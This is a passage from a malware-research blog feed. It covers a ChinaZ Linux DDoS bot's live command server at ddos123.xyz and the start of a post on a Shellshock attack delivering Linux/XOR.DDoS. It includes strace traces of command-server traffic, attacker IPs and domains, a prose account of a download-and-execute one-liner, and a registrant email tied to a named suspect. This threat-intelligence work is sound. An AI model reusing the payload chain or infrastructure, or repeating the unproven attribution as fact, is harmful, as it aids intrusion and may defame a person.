here--\u003E[\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3429\u0026p=26581#p26581\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EA message to #ChinaZ actors--\u003E[\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-dmNj4MrWznI\/VdikHFt4WJI\/AAAAAAAAS5A\/Rivh1-wTcCw\/s3640-Ic42\/MeowWare.png\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/7127238207952425696\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0039-2015-chinaz-made-new-malware.html#comment-form","title":"1 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/7127238207952425696"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/7127238207952425696"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0039-2015-chinaz-made-new-malware.html","title":"MMD-0039-2015 - ChinaZ made new malware: ELF Linux\/BillGates.Lite"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-m1noC0b84BI\/Vdh4uDrQjkI\/AAAAAAAAS4U\/3xsoawY8Hv4\/s72-c\/2Untitled.png","height":"72","width":"72"},"thr$total":{"$t":"1"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-4294379178017401679"},"published":{"$t":"2015-08-10T14:53:00.001-07:00"},"updated":{"$t":"2015-08-22T23:46:02.586-07:00"},"title":{"type":"text","$t":"MMD-0038-2015 - ChinaZ and ddos123.xyz"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003ESorry to keep on saying this, previous posts about ChinaZ are in [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/01\/mmd-0030-2015-new-elf-malware-on.html\"\u003E-1-\u003C\/a\u003E] [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/06\/the-elf-chinaz-reloaded.html\"\u003E-2-\u003C\/a\u003E]. A loy of effort was done to this threat, we grabbed its builder in some CNC we spotted, and we also PoC \"a suspected\" coder of the ChinaZ malware turned out to be high-schooler 3rd grade in his effort of improving source code of ChinaZ in GitHub DDoSClient repository early in this year, but it seems the real actors is still out there continuing his malicious scheme. And this post is having information that may lead to him.  \u003Cp\u003EAs team, we must say this post is not so technical, but more to the investigation of one of ChinaZ suspected bad actor, so our apology for some of you may not be interested to read this topic. We also know that many of security folks don't agree on pointing out a suspect in cyber crime for the OPSEC purpose.  \u003Cp\u003EHowever. the information posted here was passed to the authorities and enforcement for more than 10days by now. And the information contains  many useful threat indicators that can be used by security entity to mitigate or blocking the infrastructure used, or for the good people in PRC can trace the threat deeper, which are reasons to share it too as per it is.  \u003Cp\u003E\u003Ch2\u003EInfection and malware CNC analysis result\u003C\/h2\u003E \u003Cp\u003EIt is (always) started from the HFS panel with the infection distribution of the shellshock. Below is the panel, and the shellshock method is as per previously posted cases detail, nothing new. Thank's @benkow for the information sharing. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Nnd1P1ypWBk\/Vchyi8kvU9I\/AAAAAAAASyQ\/-iDy2qBHDsU\/s2979-Ic42\/Untitled.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Nnd1P1ypWBk\/Vchyi8kvU9I\/AAAAAAAASyQ\/-iDy2qBHDsU\/s580-Ic42\/Untitled.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe two samples of the ChinaZ are the focus of this post, a pair of the same codes of 32 and 64bit version. Our team mate uploaded and tagged those in virus total in [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/bcaa006c5d87e387d3e2821c384afb0f11ca4817f56ba5835d8b0b4ea7681e9c\/analysis\/1439198146\/\"\u003E-1-\u003C\/a\u003E] and [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/1ce92cc438db229e67d9a66a40cb550ded9167b665fcbfc8db180827f6267c9b\/analysis\/1439198176\/\"\u003E-2-\u003C\/a\u003E].  \u003Cp\u003E\u003Ci\u003EFrom this part, since the post may be sensitive and may raise conflict in interest, I hereby inform that I am to be personally responsible for what had been investigated and had posted here, not my team.\u003C\/i\u003E \u003Cp\u003EThe binaries are obviously ChinaZ, and it was a bit surprising to know that the sample is still actively communicate to its CNC as per recent tests:\u003Cbr\u003E\u003Cpre class=\"brush: c\"\u003E\/\/ DNS connection\u003Cbr \/\u003Econnect(1, {sa_family=AF_INET, \u003Cbr \/\u003E            sin_port=htons(53), \u003Cbr \/\u003E            sin_addr=inet_addr(\"$DNS\")}, 16)\u003Cbr \/\u003E\/\/ DNS query formed \u0026 replied:\u003Cbr \/\u003Esend(1, \"\\235\\210\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\3www\\7ddos123\\3xyz\\0\\0\\1\\0\"..., )\u003Cbr \/\u003Erecvfrom(1, \"\\235\\210\\201\\200\\0\\1\\0\\1\\0\\2\\0\\2\\3www\\7ddos123\\3xyz\\0\\0\\1\\0\"..., \u003Cbr \/\u003E\/\/ send cnc a mesg used resolved addr..\u003Cbr \/\u003Econnect(0, { sa_family=AF_INET, \u003Cbr \/\u003E             sin_port=htons(\"29135\"), \u003Cbr \/\u003E             sin_addr=inet_addr(\"42.51.156.201\")}\u003Cbr \/\u003E\/\/ Noted this typical ChinaZ msg..\u003Cbr \/\u003Ewrite(2, \"Connect:: Operation now in progress\"...,)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EA curiosity for this CNC authentication made me check it further into socket level to its IP:socket.. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\/\/ connection trace\u003Cbr \/\u003ETCP MMD.SMACKS.CHINAZ.:43708-\u003E42.51.156.201:29135 (ESTABLISHED)\u003Cbr \/\u003E\/\/ socket test as CNC PoC...\u003Cbr \/\u003E[42.51.156.201] 29135 (?) open\u003Cbr \/\u003EConnection to 42.51.156.201 29135 port [tcp\/*] succeeded!\u003Cbr \/\u003Ed\u003C\/pre\u003Ewe have a what seems to be alive and actively responding CNC here. But let's not jump into any conclusion before seeing the next sections..  \u003Cp\u003E\u003Ch2\u003EThe origin analysis and validity\u003C\/h2\u003E \u003Cp\u003EThe DNS request shows a query to a hostname of \u003Cfont color=yellow\u003E\u003Cb\u003Ewww.ddos123.xyz\u003C\/b\u003E\u003C\/font\u003E and is registered in current DNS record as: \u003Cpre class=\"brush: asm\"\u003E;; ANSWER SECTION:\u003Cbr \/\u003Ewww.ddos123.xyz.        2518    IN      A       42.51.156.201\u003Cbr \/\u003E;; AUTHORITY SECTION:\u003Cbr \/\u003Eddos123.xyz.            2517    IN      NS      ns1.72dns.com.\u003Cbr \/\u003Eddos123.xyz.            2517    IN      NS      ns2.idc1.cn.\u003Cbr \/\u003E;; ADDITIONAL SECTION:\u003Cbr \/\u003Ens1.72dns.com.          1808    IN      A       101.226.167.174\u003Cbr \/\u003E\u003C\/pre\u003EJust to be sure, I search by RRset mode to find range of activity of the suspected domain, and the result shows it wasn't sinkhole and under origin of the registrant as per initially registered. \u003Cpre class=\"brush: asm\"\u003Ebailiwick xyz.\u003Cbr \/\u003Ecount 60\u003Cbr \/\u003Efirst seen 2015-03-12 07:26:22 -0000\u003Cbr \/\u003Elast seen 2015-08-03 07:42:07 -0000\u003Cbr \/\u003Eddos123.xyz. NS ns2.idc1.cn.\u003Cbr \/\u003Eddos123.xyz. NS ns1.72dns.com.\u003Cbr \/\u003E\u003C\/pre\u003EWe must admit it is a kind of weird for ddoser actor's used hostname showing \"ddos\" keyword, it's too blatant, isn't it? I mean what would you think to see a CNC of backdoor\/ddoser ELF malware with hostname as \u003Cfont color=yellow\u003E\u003Cb\u003Ewww.ddos123.xyz\u003C\/b\u003E\u003C\/font\u003E? But since the checks are solidly explained and DNSDB records + DNS records implies the initial sate unchanged, showing a full control of the domain from whoever actor who set it up as CNC calls, it makes some senses. But let's also check this a bit further..  \u003Cp\u003EThe CNC hostname, is in \u003Cfont color=yellow\u003E\u003Cb\u003E42.51.156.201\u003C\/b\u003E\u003C\/font\u003E. The local internet service stated the origin of the IP is in below written area: \u003Cpre class=\"brush: asm\"\u003E河南省郑州市 \u003Cbr \/\u003E河南电联通信技术有限公司\u003C\/pre\u003EAnd matched to my custom GeoIP API that is pointing to: \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"42.51.156.201\",\u003Cbr \/\u003E  \"hostname\": \" htuidc.bgp.ip\",\u003Cbr \/\u003E  \"city\": \"Zhengzhou\",\u003Cbr \/\u003E  \"region\": \"Henan\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"34.6836,113.5325\",\u003Cbr \/\u003E  \"routes\": \"42.51.128.0\/17\",\u003Cbr \/\u003E  \"org\": \"AS56005 Henan Telcom Union Technology Co., LTD\"\u003Cbr \/\u003E\u003C\/pre\u003EIt's a node in network in Zhengzhou city of  Henan, prefecture in the People Republic of China (PRC) country, and, again, comparing the network to several sinkhole database and it doesn't match to any sinkhole nodes too, so we are positive to see an alive CNC in that area, with noted, it is in a hardline IP address.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-cQ48mcVAXOM\/VciSWEaDvsI\/AAAAAAAASys\/x1rUJC5ReNs\/s2912-Ic42\/000002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-cQ48mcVAXOM\/VciSWEaDvsI\/AAAAAAAASys\/x1rUJC5ReNs\/s580-Ic42\/000002.png\u003E\u003C\/a\u003E \u003Cp\u003EThe interesting part is, the hostname (the www pointer) \u003Cfont color=yellow\u003E\u003Cb\u003Ewww.ddos123.xyz\u003C\/b\u003E\u003C\/font\u003E and domain (the \"@\" pointer) \u003Cfont color=yellow\u003E\u003Cb\u003Eddos123.xyz\u003C\/b\u003E\u003C\/font\u003E are not pointing to the same IP. I.e. the ddos123.xyz is with A record in \u003Cb\u003E43.249.11.171\u003C\/b\u003E: \u003Cpre class=\"brush: asm\"\u003E;; ANSWER SECTION:\u003Cbr \/\u003Eddos123.xyz.            3600    IN      A       \"43.249.11.171\"\u003Cbr \/\u003E;; AUTHORITY SECTION:\u003Cbr \/\u003Eddos123.xyz.            3600    IN      NS      ns1.72dns.com.\u003Cbr \/\u003Eddos123.xyz.            3600    IN      NS      ns2.idc1.cn.\u003Cbr \/\u003E;; ADDITIONAL SECTION:\u003Cbr \/\u003Ens1.72dns.com.          600     IN      A       101.226.167.174\u003C\/pre\u003EWhich is served in a VPS in the very different location and service under this BGP [\u003Ca href=\"http:\/\/justpaste.it\/mxrq\"\u003Elink\u003C\/a\u003E] info.. \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"43.249.11.171\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Qingdao\",\u003Cbr \/\u003E  \"region\": \"Shandong\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"36.0986,120.3719\",\u003Cbr \/\u003E  \"org\": \"AS62468 VpsQuan L.L.C.\"\u003Cbr \/\u003E\u003C\/pre\u003EThis also implies that the actor doesn't want to link the domain to the its usage as CNC hostname, but it is not eliminating the previous result that it has the full control to make domain's record arrangement so far, unless we can proof the domain was hacked or hijacked (checked that too so far and the result is likely not).  \u003Cp\u003E\u003Ch2\u003EThe registration and some information\u003C\/h2\u003E \u003Cp\u003ENow we can assume to have a valid data: the \u003Cfont color=yellow\u003E\u003Cb\u003Eddos123.xyz\u003C\/b\u003E\u003C\/font\u003E internet domain name belongs to the actor. let's find out who is responsible for this domain's arrangement.   \u003Cp\u003EThe registration investigation came up with a contact email address of \u003Cfont color=yellow\u003E\u003Cb\u003E130128628@qq.com\u003C\/b\u003E\u003C\/font\u003E, and additionally linked to below registered domains the in the internet: \u003Cpre class=\"brush: asm\"\u003Ezhmr.org \u003Cbr \/\u003Eddos123.xyz  \u003Cbr \/\u003Eddoscc.xyz\u003C\/pre\u003EIt is interesting to know the keyword \"ddos\" was used to more than one domain. And the usage of the .XYZ domain is reminding me to the previous takedown 103 domains that was being used by ChinaZ in different case..a relation?\u003Cbr\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E previously we had 8379526@qq.com  that leads to mass 103 .XYZ domains for being used by ChinaZ too.. \u003Ca href=\"http:\/\/t.co\/6QZkGFPW1F\"\u003Epic.twitter.com\/6QZkGFPW1F\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/630977908396290049\"\u003EAugust 11, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003EOK, checking further..each domain was registered in the \"same way\" too, please see how registration was written as per below snipped WHOIS record: \u003Cpre class=\"brush: asm\"\u003EDomain Name:ZHMR.ORG\u003Cbr \/\u003EDomain ID: D173189409-LROR\u003Cbr \/\u003ECreation Date: 2014-07-04T07:27:48Z\u003Cbr \/\u003EUpdated Date: 2015-07-05T01:32:50Z\u003Cbr \/\u003ERegistry Expiry Date: 2016-07-04T07:27:48Z\u003Cbr \/\u003ESponsoring Registrar:PDR Ltd. d\/b\/a PublicDomainRegistry.com (R27-LROR)\u003Cbr \/\u003ESponsoring Registrar IANA ID: 303\u003Cbr \/\u003EWHOIS Server:\u003Cbr \/\u003EReferral URL:\u003Cbr \/\u003EDomain Status: clientTransferProhibited -- http:\/\/www.icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003EDomain Status: autoRenewPeriod -- http:\/\/www.icann.org\/epp#autoRenewPeriod\u003Cbr \/\u003ERegistrant ID:DI_37377779\u003Cbr \/\u003ERegistrant Name:\"hu lu\"\u003Cbr \/\u003ERegistrant Organization:\"hu lu\"\u003Cbr \/\u003ERegistrant Street: beijingxinchengshishi\u003Cbr \/\u003ERegistrant City:xincheng\u003Cbr \/\u003ERegistrant State\/Province:Beijing\u003Cbr \/\u003ERegistrant Postal Code:071800\u003Cbr \/\u003ERegistrant Country:CN\u003Cbr \/\u003ERegistrant Phone:+86.5555555\u003Cbr \/\u003ERegistrant Phone Ext:\u003Cbr \/\u003ERegistrant Fax: +86.5555555\u003Cbr \/\u003ERegistrant Fax Ext:\u003Cbr \/\u003ERegistrant Email:\"130128628@qq.com\"\u003Cbr \/\u003E\u003Cbr \/\u003EDomain Name: DDOS123.XYZ\u003Cbr \/\u003EDomain ID: D7151240-CNIC\u003Cbr \/\u003EWHOIS Server: whois.72dns.com\u003Cbr \/\u003EReferral URL: http:\/\/www.72e.net\u003Cbr \/\u003EUpdated Date: 2015-06-25T09:27:23.0Z\u003Cbr \/\u003ECreation Date: 2015-03-12T10:27:23.0Z\u003Cbr \/\u003ERegistry Expiry Date: 2016-03-12T23:59:59.0Z\u003Cbr \/\u003ESponsoring Registrar: Foshan YiDong Network Co.LTD\u003Cbr \/\u003ESponsoring Registrar IANA ID: 1563\u003Cbr \/\u003EDomain Status: clientTransferProhibited https:\/\/icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003EDomain Status: serverTransferProhibited https:\/\/icann.org\/epp#serverTransferProhibited\u003Cbr \/\u003ERegistrant ID: pi68yf15rg63o3zq\u003Cbr \/\u003ERegistrant Name: \"wo wo\"\u003Cbr \/\u003ERegistrant Organization: \"wo wo\"\u003Cbr \/\u003ERegistrant Street: beijingbeijingbeijing\u003Cbr \/\u003ERegistrant City: beijing\u003Cbr \/\u003ERegistrant State\/Province: beijing\u003Cbr \/\u003ERegistrant Postal Code: 000101\u003Cbr \/\u003ERegistrant Country: CN\u003Cbr \/\u003ERegistrant Phone: +86.105801000\u003Cbr \/\u003ERegistrant Phone Ext:\u003Cbr \/\u003ERegistrant Fax: +86.15121231\u003Cbr \/\u003ERegistrant Fax Ext:\u003Cbr \/\u003ERegistrant Email: \"130128628@qq.com\"\u003Cbr \/\u003E\u003Cbr \/\u003EDomain Name: DDOSCC.XYZ\u003Cbr \/\u003EDomain ID: D7465669-CNIC\u003Cbr \/\u003EWHOIS Server: whois.72dns.com\u003Cbr \/\u003EReferral URL: http:\/\/www.72e.net\u003Cbr \/\u003EUpdated Date: 2015-06-25T09:27:24.0Z\u003Cbr \/\u003ECreation Date: 2015-04-06T10:27:24.0Z\u003Cbr \/\u003ERegistry Expiry Date: 2016-04-06T23:59:59.0Z\u003Cbr \/\u003ESponsoring Registrar: Foshan YiDong Network Co.LTD\u003Cbr \/\u003ESponsoring Registrar IANA ID: 1563\u003Cbr \/\u003EDomain Status: clientTransferProhibited https:\/\/icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003EDomain Status: serverTransferProhibited https:\/\/icann.org\/epp#serverTransferProhibited\u003Cbr \/\u003ERegistrant ID: 2lkqa4quhzht2pcg\u003Cbr \/\u003ERegistrant Name: \"wo wo\"\u003Cbr \/\u003ERegistrant Organization: \"wo wo\"\u003Cbr \/\u003ERegistrant Street: beijingbeijingbeijing\u003Cbr \/\u003ERegistrant City: beijing\u003Cbr \/\u003ERegistrant State\/Province: beijing\u003Cbr \/\u003ERegistrant Postal Code: 000101\u003Cbr \/\u003ERegistrant Country: CN\u003Cbr \/\u003ERegistrant Phone: +86.105801000\u003Cbr \/\u003ERegistrant Phone Ext:\u003Cbr \/\u003ERegistrant Fax: +86.15121231\u003Cbr \/\u003ERegistrant Fax Ext:\u003Cbr \/\u003ERegistrant Email: \"130128628@qq.com\"\u003Cbr \/\u003E\u003C\/pre\u003EWe can see some attempts to \"fake\" whois information up there. Made those look suspicious. Seeking more malicious record linked to these domains might lead us to something else, but I will focus to the case we ChinaZ CNC verdict in hand.. \u003Ca name=\"sourcecode\"\u003E \u003Cp\u003EAfter some searching in the internet, it was recorded the QQ account was used in a bulletin board with this profile [\u003Ca href=\"http:\/\/www.hkmke.com\/uid-5166.html\"\u003Elink\u003C\/a\u003E] as a contact information. Below is the screenshots and please noted that I am not accusing anyone with anything (yet) here.\u003C\/a\u003E \u003Cp\u003EThis was a posted in December 2014, a request on searching for a source [\u003Ca href=\"http:\/\/www.hkmke.com\/thread-13950-1-1.html\"\u003Elink\u003C\/a\u003E]..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-GU90Yf57iQk\/VciSUVqENVI\/AAAAAAAASyk\/R1BlupF9hbc\/s2800-Ic42\/Untitled.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-GU90Yf57iQk\/VciSUVqENVI\/AAAAAAAASyk\/R1BlupF9hbc\/s500-Ic42\/Untitled.png\u003E\u003C\/a\u003E\u003Cbr\u003EHe was seeking solution for Linux related problem [\u003Ca href=\"http:\/\/www.hkmke.com\/thread-13949-1-1.html\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EwD28V1d9ng\/VckZwrIPCEI\/AAAAAAAASy8\/rTS87IrMJeU\/s2852-Ic42\/000003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EwD28V1d9ng\/VckZwrIPCEI\/AAAAAAAASy8\/rTS87IrMJeU\/s400-Ic42\/000003.png\u003E\u003C\/a\u003E\u003Cbr\u003E interesting tweet discussion regarding to the message posted by the suspected actor:\u003Cbr\u003E\u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/nekoworkshop\"\u003E@nekoworkshop\u003C\/a\u003E So that is how they call Linux\/BillGates is, ref: \u003Ca href=\"http:\/\/t.co\/wC9iUjMNar\"\u003Ehttp:\/\/t.co\/wC9iUjMNar\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/630878424974798848\"\u003EAugust 10, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003Ewas suggesting the actor's effort in seeking for Linux malware.. \u003Cp\u003EWe have internal discussion about posting or not posting this information, but considering only very few people can seek this far, it would be better to post it for other can take a lead for the further step\/approach to stop the actor. All of the information was reported, and we will leave to the law enforcement for the next steps..  \u003Cp\u003E\u003Ch2\u003EEpilogue\u003C\/h2\u003E \u003Cp\u003EGood people were collaborated to takedown the used CNC domains:\u003Cbr\u003E\u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003Ein process . \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; sachin (@essachin) \u003Ca href=\"https:\/\/twitter.com\/essachin\/status\/630959685990887424\"\u003EAugust 11, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E\u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EChinaZ actor can kiss his new domains goodbye:\u0026#10;\u003Ca href=\"http:\/\/t.co\/Rqh9iuMHoH\"\u003Ehttp:\/\/t.co\/Rqh9iuMHoH\u003C\/a\u003E\u0026#10;\u003Ca href=\"http:\/\/t.co\/OSeybbYbT7\"\u003Ehttp:\/\/t.co\/OSeybbYbT7\u003C\/a\u003E\u0026#10;thanks \u003Ca href=\"https:\/\/twitter.com\/xyz\"\u003E@xyz\u003C\/a\u003E \u0026amp; \u003Ca href=\"https:\/\/twitter.com\/essachin\"\u003E@essachin\u003C\/a\u003E rocks!\u0026#10;\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/631351847500976129\"\u003EAugust 12, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThe moral of the story is, even if you don't see the other users in real life via internet, it doesn't mean you can abuse them or any machines online and make illegal money by badly utilizing it. It is bad, and every badness in life will come back to you, eventually.   \u003Cp\u003ESample is shared in kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3682#p26494\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003E#MalwareMustDie"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/4294379178017401679\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0037-2015-chinaz-and-ddos123xyz.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/4294379178017401679"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/4294379178017401679"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/08\/mmd-0037-2015-chinaz-and-ddos123xyz.html","title":"MMD-0038-2015 - ChinaZ and ddos123.xyz"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-Nnd1P1ypWBk\/Vchyi8kvU9I\/AAAAAAAASyQ\/-iDy2qBHDsU\/s72-c\/Untitled.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-3695077403403160410"},"published":{"$t":"2015-07-15T21:44:00.001-07:00"},"updated":{"$t":"2015-08-06T20:07:46.989-07:00"},"title":{"type":"text","$t":"MMD-0037-2015 - A bad Shellshock \u0026 Linux\/XOR.DDoS CNC \"under the hood\""},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cp\u003EYesterday was a hectic day when we gathered to check all recent ELF threats cross-fired in the internet traffic when I was informed of a recent shellshock attack. Seeing the command pattern of the one-liner shell executed script used I knew almost instantly it was Linux\/XOR.DDoS, I checked the payload and tweeted it as per below, which is obviously a PRC (people rep of China) crook product malware known as Linux\/XOR.DDoS \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EHeres payload \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/XOR.DDoSer \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E \u0026#10;Ref: \u003Ca href=\"http:\/\/t.co\/5gVAurzsRm\"\u003Ehttp:\/\/t.co\/5gVAurzsRm\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/mowp4TTpge\"\u003Ehttps:\/\/t.co\/mowp4TTpge\u003C\/a\u003E\u0026#10;\u003Ca href=\"https:\/\/t.co\/7Y49pXIryZ\"\u003Ehttps:\/\/t.co\/7Y49pXIryZ\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/GB188BPBJV\"\u003Epic.twitter.com\/GB188BPBJV\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620561678363570177\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E\u003Cbr\u003EWell.. it was past my bed time and I about to sleep so I asked our expert mates MMD ELF Team who are living in other part of our globe to check whether this one has something new.  \u003Cp\u003EIt turned out that because of this findings I couldn't even sleep at all until almost morning, and this post is explaining you why.  \u003Cp\u003E\u003Ch2\u003EThe shellshock\u003C\/h2\u003E \u003Cp\u003EThe shellshock was fired to the victims on July 13th, 2015. I will go straight to the beautified code of the one-liner bash command injected through it:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-e_8b4bhZJfs\/VaRpNcuEF4I\/AAAAAAAASe4\/Ool6oV8DwGQ\/s2912-Ic42\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-e_8b4bhZJfs\/VaRpNcuEF4I\/AAAAAAAASe4\/Ool6oV8DwGQ\/s580-Ic42\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EFor a summary of what this command do in a paragraph is:  \u003Cp\u003E\u003Ci\u003E\u003Cb\u003EBeing executed under the UID of the web server\u003C\/b\u003E\u003C\/i\u003E, this one-liner script removed the \u003Cb\u003Eprocess ID\u003C\/b\u003E file of \u003Cb\u003Esftp\u003C\/b\u003E daemon (\u003Cb\u003Epid \u003C\/b\u003Efiles are written by some programs to record their process ID while they are starting), checking whether the file \u003Cb\u003E6000.rar\u003C\/b\u003E exists in the current directory to then delete it if exists, and then executing the download for \u003Cb\u003E6000.rar\u003C\/b\u003E file from multiple IP addresses (\u003Cfont color=red\u003E\u003Cb\u003E43.255.188.2 \/ 103.20.195.254 \/ 122.10.85.54\u003C\/b\u003E\u003C\/font\u003E) in their root directories by either \u003Cb\u003Ewget or curl\u003C\/b\u003E software, checked if the download file is there to then change the permission into executable and execute it with printing message \u003Cb\u003E\"ExecOK\"\u003C\/b\u003E. And then, even if the file wasn't downloaded successfully, it then check your distribution info, HDD status, processes (if it hits the linux box will show \u003Cb\u003EUID, PID, PPID, Time \u0026 Command\u003C\/b\u003E..but in BSD will bring \"different interesting\" result :D) and check your \u003Cb\u003Eethernet connection \u003C\/b\u003Eshowing local, remote address w\/program that runs it. To then print message \u003Cb\u003E\"ExecOK\"\u003C\/b\u003E. Then the script will print contents of process ID of \u003Cb\u003Esftp\u003C\/b\u003E, \u003Cb\u003Emount \u003C\/b\u003Eand \u003Cb\u003Egcc\u003C\/b\u003E, following by printing message \u003Cb\u003E\"InstallOK\"\u003C\/b\u003E.   \u003Cp\u003EIn the last part it set the download URL to one of previously mentioned IP address to download (by using either \u003Cb\u003Ewget 